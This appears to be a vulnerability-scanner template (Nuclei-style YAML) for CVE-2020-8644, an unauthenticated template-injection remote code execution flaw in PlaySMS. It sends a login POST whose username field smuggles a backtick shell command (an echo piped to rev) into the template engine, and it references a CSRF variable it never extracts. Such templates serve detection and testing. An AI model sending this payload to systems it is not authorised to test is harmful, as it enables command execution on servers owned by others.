id: yaml-poc-playsms_project-playsms-rce-CVE-2020-8644

info:
  name: yaml-poc-playsms_project-playsms-rce-CVE-2020-8644
  author: jiapeng.han
  severity: critical
  tags: xray-converted,rce,cve-2020-8644
  reference:
    - http://packetstormsecurity.com/files/157106/PlaySMS-index.php-Unauthenticated-Template-Injection-Code-Execution.html
    - https://forum.playsms.org/t/playsms-1-4-3-has-been-released/2704
    - https://nvd.nist.gov/vuln/detail/CVE-2020-8644
    - https://packetstormsecurity.com/files/157106/PlaySMS-index.php-Unauthenticated-Template-Injection-Code-Execution.html
    - https://playsms.org/2020/02/05/playsms-1-4-3-has-been-released/
    - https://research.nccgroup.com/2020/02/11/technical-advisory-playsms-pre-authentication-remote-code-execution-cve-2020-8644/
    - https://www.exploit-db.com/exploits/48335

http:
  - raw:
      - |
        GET /index.php?app=main&inc=core_auth&route=login HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        POST /index.php?app=main&inc=core_auth&route=login&op=login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Origin: {{BaseURL}}

        X-CSRF-Token={{csrf}}&username=%7B%7B%60echo%20%27{{rand_base(8)}}%27%20%7C%20rev%60%7D%7D&password=

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200